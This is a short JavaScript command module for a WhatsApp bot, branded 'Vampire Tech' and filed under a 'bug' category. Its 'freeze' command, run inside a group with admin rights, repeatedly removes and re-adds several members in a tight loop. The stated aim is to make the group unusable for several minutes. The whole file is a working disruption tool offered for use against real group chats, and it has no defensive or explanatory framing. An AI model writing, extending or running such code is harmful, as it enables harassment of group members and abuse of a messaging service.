export default {
  name: 'freeze',
  description: 'Freeze a group - makes it unusable',
  category: 'bug',
  aliases: ['freezegc', 'ice', 'frozen'],
  ownerOnly: true,
  async execute(sock, msg, args) {
    const chatId = msg.key.remoteJid;
    if (!chatId.endsWith('@g.us')) return sock.sendMessage(chatId, { text: '❌ Use in a group!' }, { quoted: msg });
    
    try {
      const meta = await sock.groupMetadata(chatId);
      const members = meta.participants.filter(p => p.id !== sock.user.id && !p.admin);
      
      await sock.sendMessage(chatId, { text: `❄️ *FREEZING GROUP...*\nGroup will be unusable for 5 minutes!` });
      
      // Remove and add members rapidly to freeze the group
      for (let cycle = 0; cycle < 10; cycle++) {
        for (const member of members.slice(0, 3)) {
          try {
            await sock.groupParticipantsUpdate(chatId, [member.id], 'remove');
            await new Promise(r => setTimeout(r, 200));
            await sock.groupParticipantsUpdate(chatId, [member.id], 'add');
            await new Promise(r => setTimeout(r, 200));
          } catch(e) {}
        }
        await new Promise(r => setTimeout(r, 1000));
      }
      
      await sock.sendMessage(chatId, { text: `❄️ *GROUP FROZEN!*\nGroup will recover in ~5 minutes.\n\n⚡ *Vampire Tech* 🧛` });
    } catch(e) {
      await sock.sendMessage(chatId, { text: '❌ Failed! I need admin.' }, { quoted: msg });
    }
  }
};
